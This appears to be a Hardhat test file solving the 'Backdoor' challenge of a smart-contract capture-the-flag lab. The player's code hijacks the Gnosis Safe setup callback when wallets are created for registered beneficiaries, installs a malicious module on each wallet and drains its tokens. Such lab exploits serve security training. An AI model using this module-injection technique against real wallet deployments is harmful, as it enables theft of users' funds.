const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, player;
    let masterCopy, walletFactory, token, walletRegistry;

    const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;

    async function multiTransactionAttack(target) {

        // Deploy a Gnosis Safe Wallet, with an extra function that allows
        // us to easily add malicious modules
        let fakeWalletFactory = await ethers.getContractFactory('AttackFakeWallet', player);
        let fakeWallet = await fakeWalletFactory.deploy();

        // Misc functions for which we need to perform encodeFunctionData
        const abi = [
            "function setup(address[] calldata, uint256, address, bytes calldata, address, address, uint256, address payable)",
            "function enableModule(address)",
            "function enableModule2(address)",
            "function transfer(address, uint256)"
        ];
        const iface = new ethers.utils.Interface(abi);

        // Encode call the malicious module installation function
        const enableModule2Call = iface.encodeFunctionData('enableModule2', [player.address]);

        // Encode call to Gnosis Safe setup function configuring this to invoke
        // the malicious module installer.
        const owners = [target];
        const threshold = 1;
        const to = fakeWallet.address;
        const data = enableModule2Call;
        const fallbackHandler = "0x0000000000000000000000000000000000000000";
        const paymentToken = "0x0000000000000000000000000000000000000000";
        const payment = 0;
        const paymentReceiver = "0x0000000000000000000000000000000000000000";
        const setupCall = iface.encodeFunctionData('setup', [owners, threshold, to, data, fallbackHandler, paymentToken, payment, paymentReceiver]);

        // Create attack target's wallet with a malicious module.
        let tx = await walletFactory.connect(player).createProxyWithCallback(masterCopy.address, setupCall, 0, walletRegistry.address);
        let receipt = await tx.wait();

        // Grab the wallet creation event to extract the attack target's wallet address.
        let evt = receipt.events?.find((x) => x.event == "ProxyCreation");
        expect(!evt).to.be.false

        console.log("ProxyCreation Event", evt);
        console.log();
        let targetWallet = fakeWalletFactory.attach(evt.args.proxy);

        // Verify some expected wallet properties including the malicious module installation
        expect((await targetWallet.getOwners())[0]).to.be.equal(target);
        expect(await targetWallet.isModuleEnabled(player.address)).to.be.true;
        expect(await token.balanceOf(targetWallet.address)).to.be.equal((10n * 10n ** 18n).toString())

        console.log("BEFORE")
        console.log("Target Balance:", await token.balanceOf(targetWallet.address));
        console.log("Player Balance:", await token.balanceOf(player.address));
        console.log();

        // Encode a token transfer call to extract DVT tokens passing them to the player.
        const transferCall = iface.encodeFunctionData('transfer', [player.address, 10n * 10n ** 18n]);

        // Use the malicious module address (in this case its just the player)
        // to invoke the token transfer...
        await expect(
            targetWallet.connect(player).execTransactionFromModule(token.address, 0, transferCall, 0)
        ).to.emit(targetWallet, "ExecutionFromModuleSuccess").withArgs(player.address);

        console.log("AFTER")
        console.log("Target Balance:", await token.balanceOf(targetWallet.address));
        console.log("Player Balance:", await token.balanceOf(player.address));
        console.log();
    }

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy the registry
        walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            masterCopy.address,
            walletFactory.address,
            token.address,
            users
        );
        expect(await walletRegistry.owner()).to.eq(deployer.address);

        for (let i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.true;

            // User cannot add beneficiaries
            await expect(
                walletRegistry.connect(
                    await ethers.getSigner(users[i])
                ).addBeneficiary(users[i])
            ).to.be.revertedWithCustomError(walletRegistry, 'Unauthorized');
        }

        // Transfer tokens to be distributed to the registry
        await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Here is how we would run the attack if we could do multiple transactions
        // for (const elemennt of users) {
        //     await multiTransactionAttack(elemennt);
        // }

        const attackFactory = await ethers.getContractFactory('AttackWalletRegistry', player);
        await attackFactory.deploy(
            walletFactory.address,
            masterCopy.address,
            walletRegistry.address,
            token.address,
            users, { gasLimit: 30000000 });
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player must have used a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

        for (let i = 0; i < users.length; i++) {
            let wallet = await walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            expect(wallet).to.not.eq(
                ethers.constants.AddressZero,
                'User did not register a wallet'
            );

            // User is no longer registered as a beneficiary
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
